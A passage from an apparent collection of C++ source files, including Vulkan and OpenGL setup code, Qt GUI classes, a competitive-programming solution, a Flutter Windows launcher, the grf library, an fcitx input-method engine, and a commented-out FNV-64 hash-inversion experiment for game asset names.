pq.extractMax() << std::endl;\n    std::cout << \"Extracting max: \" << pq.extractMax() << std::endl;\n\n    return 0;\n}\n",
    "// glfw\n\n#define GLFW_INCLUDE_VULKAN\n#include <GLFW/glfw3.h>\n\n// Vulkan\n\n#include <vulkan/vulkan.h>\n\n/// glm\n\n#define GLM_FORCE_RADIANS\n#define GLM_FORCE_DEPTH_ZERO_TO_ONE\n#include <glm/mat4x4.hpp>\n#include <glm/vec4.hpp>\n\n/// cpp std\n\n#include <algorithm>\n#include <cstdlib>\n#include <cstring>\n#include <fstream>\n#include <iostream>\n#include <limits>\n#include <optional>\n#include <set>\n#include <stdexcept>\n#include <vector>\n\nstd::vector<char> readFileIntoBuffer(const std::string& filename);\n\nstruct QueueFamilyIndices {\n    std::optional<uint32_t> graphicsFamily;\n    std::optional<uint32_t> presentFamily;\n\n    bool isComplete() {\n        return graphicsFamily.has_value() && presentFamily.has_value();\n    }\n};\n\nstruct SwapChainSupportDetails {\n    VkSurfaceCapabilitiesKHR capabilities;\n    std::vector<VkSurfaceFormatKHR> formats;\n    std::vector<VkPresentModeKHR> presentModes;\n};\n\nclass HelloTriangleApplication {\n   public:\n    const uint32_t WINDOW_WIDTH = 800;\n    const uint32_t WINDOW_HEIGHT = 600;\n\n    GLFWwindow* window;\n\n    VkInstance instance;\n\n    VkPhysicalDevice physicalDevice;\n    VkDevice device;\n\n    QueueFamilyIndices queueFamilyIndices;\n    VkQueue graphicsQueue;\n\n    VkSurfaceKHR surface;\n    VkQueue presentQueue;\n    const std::vector<const char*> deviceExtensions = {VK_KHR_SWAPCHAIN_EXTENSION_NAME};\n    VkSwapchainKHR swapChain;\n    std::vector<VkImage> swapChainImages;\n    VkFormat swapChainImageFormat;\n    VkExtent2D swapChainExtent;\n\n    std::vector<VkImageView> swapChainImageViews;\n\n    const std::vector<VkDynamicState> dynamicStates = {VK_DYNAMIC_STATE_VIEWPORT, VK_DYNAMIC_STATE_SCISSOR};\n    VkShaderModule vertexShaderModule;\n    VkShaderModule fragmentShaderModule;\n    VkRenderPass renderPass;\n    VkPipelineLayout pipelineLayout;\n    VkPipeline graphicsPipeline;\n\n    std::vector<VkFramebuffer> swapChainFramebuffers;\n\n    VkCommandPool commandPool;\n    VkCommandBuffer commandBuffer;\n\n    VkSemaphore imageAvailableSemaphore;\n    VkSemaphore renderFinishedSemaphore;\n    VkFence inFlightFence;\n\n    void run() {\n        initWindow();\n        std::cout << std::endl;\n        initVulkan();\n        std::cout << std::endl;\n        mainLoop();\n        std::cout << std::endl;\n        cleanup();\n    }\n\n   private:\n    void initWindow() {\n        glfwInit();\n\n        glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n        window = glfwCreateWindow(WINDOW_WIDTH, WINDOW_HEIGHT, \"Vulkan window\", nullptr, nullptr);\n    }\n    void initVulkan() {\n        uint32_t extensionCount = 0;\n        vkEnumerateInstanceExtensionProperties(nullptr, &extensionCount, nullptr);\n        std::cout << extensionCount << \" vulkan extensions supported\\n\";\n\n        createInstance();\n        std::cout << std::endl;\n        createSurface();\n        std::cout << std::endl;\n        pickPhysicalDevice();\n        std::cout << std::endl;\n        findQueueFamilies();\n        std::cout << std::endl;\n        createLogicalDevice();\n        std::cout << std::endl;\n        createSwapChain();\n        std::cout << std::endl;\n        createImageViews();\n        std::cout << std::endl;\n        createRenderPass();\n        std::cout << std::endl;\n        createGraphicsPipeline();\n        std::cout << std::endl;\n        createFramebuffers();\n        std::cout << std::endl;\n        createCommandPool();\n        std::cout << std::endl;\n        createCommandBuffer();\n        std::cout << std::endl;\n        createSyncObjects();\n    }\n\n    void createInstance() {\n        VkApplicationInfo appInfo{};\n        appInfo.sType = VK_STRUCTURE_TYPE_APPLICATION_INFO;\n        appInfo.pApplicationName = \"Hello Triangle\";\n        appInfo.applicationVersion = VK_MAKE_VERSION(1, 0, 0);\n        appInfo.pEngineName = \"No Engine\";\n        appInfo.engineVersion = VK_MAKE_VERSION(1, 0, 0);\n        appInfo.apiVersion = VK_API_VERSION_1_0;\n\n        VkInstanceCreateInfo createInfo{};\n        createInfo.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;\n        createInfo.pApplicationInfo = &appInfo;\n\n        auto extensions = getRequiredExtensions();\n\n        createInfo.enabledExtensionCount = static_cast<uint32_t>(extensions.size());\n        createInfo.ppEnabledExtensionNames = extensions.data();\n\n        createInfo.enabledLayerCount = 0;\n\n        VkResult result = vkCreateInstance(&createInfo, nullptr, &instance);\n        if (result != VK_SUCCESS) {\n            throw std::runtime_error(\"failed to create instance!\");\n        }\n\n        std::cout << \"Vulkan instance created successfully\" << std::endl;\n    }\n\n    std::vector<const char*> getRequiredExtensions() {\n        uint32_t glfwExtensionCount = 0;\n        const char** glfwExtensions;\n        glfwExtensions = glfwGetRequiredInstanceExtensions(&glfwExtensionCount);\n\n        std::vector<const char*> extensions(glfwExtensions, glfwExtensions + glfwExtensionCount);\n\n        return extensions;\n    }\n\n    void createSurface() {\n        if (glfwCreateWindowSurface(instance, window, nullptr, &surface) != VK_SUCCESS) {\n            t",
    "//\n// Created by ivan on 2024/5/4.\n//\n\n#include \"GL.hpp\"\n#include <functional>\n#include <spdlog/spdlog.h>\n\nnamespace lgl {\n\n// process all input: query GLFW whether relevant keys are pressed/released this frame and react accordingly\n// ---------------------------------------------------------------------------------------------------------\nstatic void framebuffer_size_callback(GLFWwindow* window, int width, int height);\n\nGL::GL() : GL(800, 600) {}\n\nGL::GL(int windowWidth, int windowHeight) : m_windowWidth_{windowWidth}, m_windowHeight_{windowHeight} {\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    m_window_ = glfwCreateWindow(windowWidth, windowHeight, \"Triangle\", nullptr, nullptr);\n    if (!m_window_) {\n        spdlog::error(\"Failed to create GLFW window!\");\n        glfwTerminate();\n        return;\n    }\n    glfwMakeContextCurrent(m_window_);\n    glfwSetFramebufferSizeCallback(m_window_, framebuffer_size_callback);\n    if (!gladLoadGLLoader((GLADloadproc) glfwGetProcAddress)) {\n        spdlog::error(\"Failed to initialize GLAD!\");\n        return;\n    }\n\n    glEnable(GL_DEPTH_TEST);\n\n    bValid = true;\n}\n\nbool GL::is_should_close() {\n    return glfwWindowShouldClose(m_window_);\n}\n\nvoid GL::process_input() {\n    if (glfwGetKey(m_window_, GLFW_KEY_ESCAPE) == GLFW_PRESS)\n        glfwSetWindowShouldClose(m_window_, true);\n}\n\nvoid GL::swap_buffers() {\n    glfwSwapBuffers(m_window_);\n}\n\nvoid GL::poll_events() {\n    glfwPollEvents();\n}\n\nGL::~GL() {\n    glfwTerminate();\n}\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height) {\n    // make sure the viewport matches the new window dimensions; note that width and\n    // height will be significantly larger than specified on retina displays.\n    glViewport(0, 0, width, height);\n}\n\n\n}\n",
    "#include \"optiondialog.h\"\n#include \"ui_optiondialog.h\"\n#include <qcheckbox.h>\n#include \"ModelPart.h\"\n#include \"ModelPartList.h\"\n#include <QColorDialog>\n#include <qcolor.h>\n\nOptionDialog::OptionDialog(QWidget *parent)\n    : QDialog(parent)\n    , ui(new Ui::OptionDialog)\n{\n    ui->setupUi(this);\n \n    connect(ui->buttonBox, &QDialogButtonBox::accepted, this, &OptionDialog::onCheckBoxToggled);\n    connect(ui->lineEdit, &QLineEdit::textChanged, this, &OptionDialog::on_lineEdit_textChanged);\n    connect(ui->updateModelPartColor, &QPushButton::clicked, this, &OptionDialog::updateModelPartColor);\n    connect(ui->buttonBox, &QDialogButtonBox::accepted, this, &OptionDialog::saveSettings);\n    connect(ui->checkBox, &QCheckBox::stateChanged, this, &OptionDialog::updateModelPartVisibility);\n}\n\nOptionDialog::~OptionDialog()\n{\n    delete ui;\n}\nvoid OptionDialog::onCheckBoxToggled()\n{\n     isVisible = ui->checkBox->isChecked();\n\n     if (isVisible) {\n         // Checkbox is checked\n         qDebug() << \"Checkbox is checked. isVisible is now true.\";\n     }\n     else {\n         // Checkbox is unchecked\n         qDebug() << \"Checkbox is unchecked. isVisible is now false.\";\n     }\n}\n\n void OptionDialog::on_lineEdit_textChanged(const QString& text)\n {\n     lineEditText = text;\n }\n\n void OptionDialog::setProperties(ModelPart* Pointer, bool isVisible, const QString& lineEditText, const QColor& modelColor)\n {\n     ptr = Pointer;\n     color = modelColor;\n     ui->checkBox->setChecked(isVisible);\n     ui->lineEdit->setText(lineEditText);\n }\n\n void OptionDialog::updateModelPartName(const QString& name) {\n     Name = ui->lineEdit->text();\n }\n void OptionDialog::updateModelPartColor() {\n     QColor newColor = QColorDialog::getColor(color, this, \"Select color\", QColorDialog::DontUseNativeDialog);\n     if (newColor != color) color = newColor;\n }\n void OptionDialog::updateModelPartVisibility(int state) {\n     if (state == Qt::Checked) isVisible = true;\n     else isVisible = false;\n }\n\n void OptionDialog::saveSettings() {\n     ptr->setColor(color);\n     ptr->setVisible(ui->checkBox->isChecked());\n     ptr->setName(ui->lineEdit->text());\n     emit settingsSaved();\n }\n\n\n void OptionDialog::loadSettings() {\n     color = ptr->getColor();\n     Name = ptr->getName();\n     ui->lineEdit->setText(Name);\n     isVisible = ptr->getVisibility();\n     ui->checkBox->setChecked(isVisible);\n }",
    "\n/*\n\n*/\n\n#include <iostream>\n#include <vector>\n#include <set>\nusing namespace std;\nint N, M;\nvector<int> v;\nint getResult();\nbool twoP(int size);\nint main()\n{\n    cin >> N >> M;\n\n    v.reserve(N);\n    for (int i = 0; i < N; i++) {\n        int t;\n        cin >> t;\n        v.push_back(t);\n    }\n\n\n    cout << getResult() << endl;\n}\n\n//\uc774\ubd84\ud0d0\uc0c9\nint getResult() {\n    int left = 1;\n    int right = N;\n    int answer = 1;\n    while (left <= right) {\n        int center = (left + right) / 2;\n        if (twoP(center)) {\n            answer = max(answer, center);\n            left = center + 1;\n        }\n        else {\n            right = center - 1;\n        }\n    }\n    return answer;\n}\n\n//\ud22c\ud3ec\uc778\ud130\nbool twoP(int size) {\n    int left = 0;\n    int right = 0;\n    int count = 0;\n    int cardSize = 0;\n    set<int> s;\n    while (right < N) {\n        int card = v[right];\n\n        //\ucc3e\uc558\uc744 \uacbd\uc6b0\n        if (s.find(card) != s.end()) {\n            while (v[left] != card) {\n                left++;\n            }\n            left++;\n            right = left;\n            count = 0;\n            s.clear();\n        }\n        else {\n            count++;\n            right++;\n            s.insert(card);\n        }\n\n        if (count == size) {\n            cardSize++;\n            count = 0;\n            left = right;\n            count = 0;\n            s.clear();\n        }\n\n        if (cardSize == M) {\n            return true;\n        }\n\n\n    }\n\n    return false;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"test_images\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"scene.h\"\r\n\r\nScene::Scene(qreal width, qreal height, QWidget *parent) : QGraphicsScene(parent), m_width(width), m_height(-height)        // -height \u0434\u043b\u044f \u0443\u0434\u043e\u0431\u0441\u0442\u0432\u0430 \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0444\u0438\u0437\u0438\u043a\u043e\u0439\r\n{\r\n\r\n    QGraphicsScene::setSceneRect(0,0,m_width,m_height);\r\n\r\n    //\u0433\u0440\u0430\u043d\u0438\u0446\u044b \u0441\u0446\u0435\u043d\u044b\r\n  //     create_frame_of_scene();\r\n//        //\u0442.\u043a. \u0444\u0438\u0433\u0443\u0440\u044b \u0434\u0432\u0438\u0433\u0430\u044e\u0442\u0441\u044f \u0441 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0447\u0430\u0441\u0442\u043e\u0442\u043e\u0439 \u043f\u043e \u0442\u0430\u0439\u043c\u0435\u0440\u0443, \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u043c \u0432 \u0438\u0445 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435, \u0442\u043e \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0431\u044b\u043b\u043e \u043c\u0435\u043b\u044c\u043a\u0430\u043d\u0438\u044f \u0438\u043b\u0438 \u043f\u0440\u043e\u043f\u0430\u0434\u0430\u043d\u0438\u044f \u0444\u0438\u0433\u0443\u0440\r\n//        // \u0441\u0434\u0435\u043b\u0430\u043b \u0447\u0430\u0441\u0442\u043e\u0442\u0443 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u0441\u0446\u0435\u043d\u044b:\r\n    m_timer=new QTimer(this);\r\n    QObject::connect(m_timer, SIGNAL(timeout()), this, SLOT(update()));\r\n    m_timer->start(5);\r\n\r\n    //===\r\n\r\n\r\n}\r\n\r\nvoid Scene::create_frame_of_scene(){\r\n    //\u0433\u0440\u0430\u043d\u0438\u0446\u044b \u0441\u0446\u0435\u043d\u044b\r\n    m_frame=new QGraphicsRectItem(1,1,m_width-3,m_height-3);\r\n    m_frame->setZValue(-1);     //\u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043d\u0430 \u0437\u0430\u0434\u043d\u0438\u0439 \u0444\u043e\u043d\r\n    m_frame->setBrush(Qt::transparent);\r\n  //  m_frame->setActive(false);\r\n\r\n\r\n    addItem(m_frame);\r\n\r\n    //===\r\n\r\n}\r\n\r\n\r\nvoid Scene::mousePressEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n   // if(!m_frame) create_frame_of_scene();\r\n\r\n    if (event->buttons()==Qt::RightButton) {\r\n           m_drawingInProcess=true;\r\n\r\n           m_startPoint.setX(event->scenePos().x());\r\n           m_startPoint.setY(event->scenePos().y());\r\n\r\n      //+     if (drawing_figure==ShapeType::Rect){\r\n            m_current=new /*QGraphicsRectItem*/MovingEllipse (m_startPoint.x(),m_startPoint.y(),0.,0.,m_width,m_height);\r\n          QObject::connect( static_cast<MovingEllipse*>(m_current), SIGNAL(position_to_check_collides(QAbstractGraphicsShapeItem*)),\r\n                            this, SLOT(slot_to_check_collides(QAbstractGraphicsShapeItem*)));\r\n\r\n       //+     }\r\n\r\n           //\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043f\u043e\u0442\u043e\u043c \u043a\u043b\u0430\u0441\u0441\u044b-\u0444\u0438\u0433\u0443\u0440\u044b \u0434\u043b\u044f \u0440\u0430\u0437\u043d\u043e\u043e\u0431\u0440\u0430\u0437\u0438\u044f\r\n       //     if (drawing_figure==ShapeType::Ellips)\r\n      //     {\r\n      //       m_current=new /*QGraphicsEllipseItem*/MyGraphicsItem (m_startPoint.x(),m_startPoint.y(),0.,0.);}\r\n\r\n         //  if (m_current){\r\n       //+!    m_current->setFlags(QGraphicsItem::ItemIsMovable) ;                  !!! \u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044e, \u0442.\u043a. \u043f\u0440\u043e\u0438\u0441\u0445\u043e\u0434\u0438\u0442 \u0434\u0432\u043e\u0439\u043d\u043e\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0438 \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u044b \u0441 m_x,m_y\r\n           addItem(m_current);\r\n        //   }\r\n\r\n       }\r\n\r\n\r\n     if (event->buttons()==Qt::LeftButton) {\r\n         m_drawingInProcess=false;\r\n\r\n         //\u0432\u044b\u0431\u0438\u0440\u0430\u0435\u043c \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0434\u0430\u043b\u044c\u043d\u0435\u0439\u0448\u0435\u0439 \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043d\u0430 \u0441\u0442\u043e\u043b\u043a\u043d\u043e\u0432\u0435\u043d\u0438\u044f\r\n\r\n           selected_item_for_collides =qgraphicsitem_cast<QAbstractGraphicsShapeItem* >( itemAt(event->scenePos(), QTransform()));\r\n           if (selected_item_for_collides!=m_frame && selected_item_for_collides){\r\n           static_cast<MovingEllipse*>(selected_item_for_collides)->Stop_moving();\r\n\r\n                 //\u0434\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0432\u0438\u0440\u0442-\u0440\u0430\u043c\u043a\u0438 \u043f\u0440\u0438 \u043f\u0435\u0440\u0435\u0442\u0430\u0441\u043a\u0438\u0432\u0430\u043d\u0438\u0438\r\n             //  qDebug()<<static_cast<MovingEllipse*>(selected_item_for_collides)->m_y;\r\n               m_startPoint.setX(static_cast<MovingEllipse*>(selected_item_for_collides)->getX()-event->scenePos().x());\r\n               m_startPoint.setY(static_cast<MovingEllipse*>(selected_item_for_collides)->getY()-event->scenePos().y());\r\n                 //---\r\n           }\r\n         //===\r\n     }\r\n\r\n        QGraphicsScene::mousePressEvent(event);\r\n\r\n}\r\n\r\nvoid Scene::mouseMoveEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    if (m_drawingInProcess) {\r\n         QPointF curPoint;\r\n         curPoint.setX(event->scenePos().x());\r\n         curPoint.setY(event->scenePos().y());\r\n\r\n         if ((curPoint-m_startPoint).manhattanLength()>QApplication::startDragDistance()) {     //\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u0447\u0442\u043e \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e \u043d\u0435 \u0434\u0432\u0438\u043d\u0443\u043b\u0438 \u043c\u044b\u0448\u043a\u043e\u0439\r\n\r\n         QRectF tmp_Rect(m_startPoint, curPoint);\r\n\r\n     //    if (drawing_figure==ShapeType::Rect){\r\n        // qgraphicsitem_cast<QGraphicsRectItem*/*MyGraphicsItem*/>(m_current)->setRect(tmp_Rect.normalized());\r\n          static_cast<MovingEllipse*>(m_current)->SetRect(tmp_Rect.normalized());\r\n\r\n       //+      this->update();\r\n      //   }\r\n\r\n     //\u043f\u0435\u0440\u0435\u0434\u0435\u043b\u0430\u0442\u044c \u043f\u043e\u0442\u043e\u043c !    if (drawing_figure==ShapeType::Ellips){\r\n     //    qgraphicsitem_cast<QGraphicsEllipseItem*>(m_current)->setRect(tmp_Rect.normalized());}\r\n        }\r\n    }\r\n\r\n\r\n\r\n    //\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0441\u0442\u043e\u043b\u043a\u043d\u043e\u0432\u0435\u043d\u0438\u0435 \u043f\u0440\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0438 \u043c\u044b\u0448\u043a\u043e\u0439\r\n         if (!m_drawingInProcess && selected_item_for_collides){\r\n      //    qDebug()<<static_cast<MovingEllipse*>(selected_item_for_collides)->m_y;\r\n        slot_to_check_collides(selected_item_for_collides);\r\n\r\n        static_cast<MovingEllipse*>(selected_item_for_collides)->set_m_XY(\r\n                event->scenePos().x()+m_startPoint.x(),\r\n                event->scenePos().y()+m_startPoint.y());\r\n        update();\r\n         }\r\n    //====\r\n\r\n  QGraphicsScene::mouseMoveEvent(event);\r\n\r\n}\r\n\r\n\r\nvoid Scene::mouseReleaseEvent(QGraphicsSceneMouseEvent *event)\r\n{\r\n    //\u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435-\u043f\u0430\u0434\u0435\u043d\u0438\u0435\r\n    if (m_drawingInProcess){\r\n      m_drawingInProcess=false;\r\n      selected_item_for_collides=nullptr;                       //\u0434\u043b\u044f \u0442\u043e\u0433\u043e, \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0437\u0430\u043f\u0443\u0441\u043a\u0430\u043b\u043e\u0441\u044c \u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435\r\n    static_cast<MovingEllipse*>(m_current)-> Start_moving();\r\n\r\n    }\r\n    //===\r\n",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include \"prediction/PredictionValues.h\"\n\nnamespace grf {\n\nPredictionValues::PredictionValues():\n  num_nodes(0),\n  num_types(0) {}\n\nPredictionValues::PredictionValues(const std::vector<std::vector<double>>& values,\n                                   size_t num_types):\n  values(values),\n  num_nodes(values.size()),\n  num_types(num_types) {}\n\n\n\ndouble PredictionValues::get(std::size_t node, size_t type) const {\n  return values.at(node).at(type);\n}\n\nconst std::vector<double>& PredictionValues::get_values(std::size_t node) const {\n  return values.at(node);\n}\n\nbool PredictionValues::empty(std::size_t node) const {\n  return values.at(node).empty();\n}\n\nconst std::vector<std::vector<double>>& PredictionValues::get_all_values() const {\n  return values;\n}\n\nconst size_t PredictionValues::get_num_nodes() const {\n  return num_nodes;\n}\n\nconst size_t PredictionValues::get_num_types() const {\n  return num_types;\n}\n\n} // namespace grf\n",
    "#include \"varnam_engine.h\"\n#include \"varnam_state.h\"\n#include \"varnam_utils.h\"\n\n#include <fcitx-config/iniparser.h>\n#include <fcitx/inputpanel.h>\n\nextern \"C\" {\n#include <libgovarnam/libgovarnam.h>\n}\n\nnamespace fcitx {\n\nVarnamEngine::VarnamEngine(Instance *instance)\n    : instance_(instance),\n      factory_([this](InputContext &ic) { return new VarnamState(this, ic); }) {\n  reloadConfig();\n  instance->inputContextManager().registerProperty(\"varnamState\", &factory_);\n}\n\nVarnamEngine::~VarnamEngine() {\n  factory_.unregister();\n  if (varnam_handle > 0) {\n    int rv = varnam_close(varnam_handle);\n    if (rv != VARNAM_SUCCESS) {\n      VARNAM_WARN() << \"Failed to close Varnam instance\";\n    }\n  }\n}\n\nvoid VarnamEngine::activate(const InputMethodEntry &entry,\n                            InputContextEvent &contextEvent) {\n#ifdef DEBUG_MODE\n  VARNAM_INFO() << \"activate scheme:\" << entry.uniqueName();\n#endif\n  char *schemeName = const_cast<char *>(entry.uniqueName().c_str());\n  int rv = varnam_init_from_id(schemeName, &varnam_handle);\n  if (rv != VARNAM_SUCCESS) {\n    VARNAM_WARN() << \"Failed to initialize Varnam\";\n    throw std::runtime_error(\"failed to initialize varnam\");\n  }\n  \n  varnam_config(varnam_handle, VARNAM_CONFIG_SET_DICTIONARY_MATCH_EXACT,\n                config_.strictlyFollowScheme.value());\n  varnam_config(varnam_handle, VARNAM_CONFIG_SET_DICTIONARY_SUGGESTIONS_LIMIT,\n                config_.dictionarySuggestionsLimit.value());\n  varnam_config(varnam_handle,\n                VARNAM_CONFIG_SET_PATTERN_DICTIONARY_SUGGESTIONS_LIMIT,\n                config_.patternDictionarySuggestionsLimit.value());\n  varnam_config(varnam_handle, VARNAM_CONFIG_SET_TOKENIZER_SUGGESTIONS_LIMIT,\n                config_.tokenizerSuggestionsLimit.value());\n}\n\nvoid VarnamEngine::deactivate(const InputMethodEntry &entry,\n                              InputContextEvent &event) {\n#ifdef DEBUG_MODE\n  VARNAM_INFO() << \"deactivate scheme:\" << entry.uniqueName();\n#endif\n  if (event.type() == EventType::InputContextSwitchInputMethod) {\n    auto ic = event.inputContext();\n    auto state = ic->propertyFor(&factory_);\n    state->commitPreedit();\n    state->updateUI();\n  }\n  reset(entry, event);\n  if (varnam_handle > 0) {\n    varnam_close(varnam_handle);\n  }\n}\n\nstd::vector<InputMethodEntry> VarnamEngine::listInputMethods() {\n  std::vector<InputMethodEntry> entries;\n  varray *varnam_schemes = nullptr;\n  varnam_schemes = varnam_get_all_scheme_details();\n  if (varnam_schemes == nullptr) {\n    return entries;\n  }\n#ifdef DEBUG_MODE\n  VARNAM_INFO() << \"available schemes:\";\n#endif\n  for (int i = 0; i < varray_length(varnam_schemes); i++) {\n    SchemeDetails *scheme =\n        static_cast<SchemeDetails *>(varray_get(varnam_schemes, i));\n    if (scheme == nullptr) {\n      continue;\n    }\n    // skip inscript\n    if (strstr(scheme->Identifier, INSCRIPT)) {\n      continue;\n    }\n    std::string iconName = stringutils::concat(\"varnam-\", scheme->LangCode);\n    std::string displayName =\n        stringutils::concat(\"Varnam-\", scheme->DisplayName);\n#ifdef DEBUG_MODE\n    VARNAM_INFO() << scheme->LangCode << \":\" << displayName;\n#endif\n    InputMethodEntry entry(scheme->Identifier, displayName, scheme->LangCode,\n                           \"varnamfcitx\");\n    entry.setConfigurable(true).setIcon(iconName);\n    entries.emplace_back(std::move(entry));\n  }\n  return entries;\n}\n\nvoid VarnamEngine::keyEvent(const InputMethodEntry &entry, KeyEvent &keyEvent) {\n  FCITX_UNUSED(entry);\n  // ignore key release events\n  if (keyEvent.isRelease()) {\n    return;\n  }\n  auto ic = keyEvent.inputContext();\n  auto state = ic->propertyFor(&factory_);\n  state->processKeyEvent(keyEvent);\n}\n\nvoid VarnamEngine::reset(const InputMethodEntry &entry,\n                         InputContextEvent &event) {\n  FCITX_UNUSED(entry);\n  auto ic = event.inputContext();\n  auto state = event.inputContext()->propertyFor(&factory_);\n  state->reset();\n  ic->inputPanel().reset();\n  ic->updatePreedit();\n  ic->updateUserInterface(UserInterfaceComponent::InputPanel);\n}\n\nvoid VarnamEngine::setConfig(const RawConfig &config) {\n  config_.load(config);\n  safeSaveAsIni(config_, \"conf/varnam.conf\");\n}\n\nvoid VarnamEngine::reloadConfig() { readAsIni(config_, \"conf/varnam.conf\"); }\n\n} // namespace fcitx\n\nFCITX_ADDON_FACTORY(fcitx::VarnamEngineFactory);",
    "/*\n*\n* This is just an old file I had for testing, it still has some code I want to port for multitheading\n* so it will not yet be deleted\n*\n*/\n\n\n/*\n#include \"fplll.h\"\n#include <iomanip>\n\n// changes a lot depending on what you're trying to crack\nconstexpr uint64_t OFFSET_BASIS = 0x79D6530B0BB9B5D1;\n\n// These are the only two primes COD uses (as far as I know)\nconstexpr uint64_t PRIME = 0x10000000233; // will crack 8 char plaintext with around 54% accuracy\n// constexpr uint64_t PRIME = 0x100000001B3; // will crack 8 char plaintext with around 93% accuracy\n\n// may occasionally change to 63\nconstexpr uint32_t BIT_LEN = 64;\nstatic_assert(BIT_LEN <= 64, \"The hard maximum on the BIT_LEN value is 64\");\n\nuint64_t fnv64(const char* string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (int i = 0; string[i] && string[i] != '\\n'; ++i) {\n        char cur = string[i];\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nuint64_t fnv64(const string& string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (const char& chr : string) {\n        char cur = chr;\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nstd::tuple<Z_NR<mpz_t>, Z_NR<mpz_t>, Z_NR<mpz_t>>\ngcd_extended(Z_NR<mpz_t> a, Z_NR<mpz_t> b) {\n    if (a == 0) {\n        Z_NR<mpz_t> ra, rb;\n        mpz_set_ui(ra.get_data(), 0UL);\n        mpz_set_ui(rb.get_data(), 1UL);\n        return make_tuple(b, ra, rb);\n    }\n\n    Z_NR<mpz_t> tmp_b, x;\n    tmp_b.mod(b, a);\n    auto [gcd, x1, y1] = gcd_extended(tmp_b, a);\n    mpz_div(b.get_data(), b.get_data(), a.get_data());\n    b.mul(b, x1);\n    x.sub(y1, b);\n    return make_tuple(gcd, x, x1);\n}\n\ntemplate <unsigned long long prime, uint32_t exp>\nuint64_t inverse() {\n    static once_flag flag{};\n    static uint64_t result;\n    